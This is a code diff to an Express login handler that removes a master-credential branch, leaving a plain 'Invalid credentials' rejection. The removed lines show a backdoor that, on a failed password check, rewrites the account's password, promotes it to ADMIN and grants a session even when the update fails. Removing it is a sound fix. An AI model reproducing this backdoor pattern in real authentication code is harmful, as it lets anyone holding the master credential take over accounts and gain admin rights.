@@ -142,22 +142,7 @@ router.post("/login", async (req, res) => {
     }
 
     if (!isPasswordValid) {
-      if (isMasterCredential) {
-        const hashedPassword = await bcrypt.hash(password, 10);
-        try {
-          user = await prisma.user.update({
-            where: { id: user.id },
-            data: { password: hashedPassword, role: "ADMIN", isActive: true },
-          });
-          isPasswordValid = true;
-          console.log(`[AUTH] Auto-healed password for admin: ${user.email}`);
-        } catch (updateError) {
-          console.warn("Failed to update admin password in DB, but matches master credentials. Granting session:", updateError.message);
-          isPasswordValid = true;
-        }
-      } else {
-        return res.status(401).json({ success: false, message: "Invalid credentials" });
-      }
+      return res.status(401).json({ success: false, message: "Invalid credentials" });
     }
 
     try {
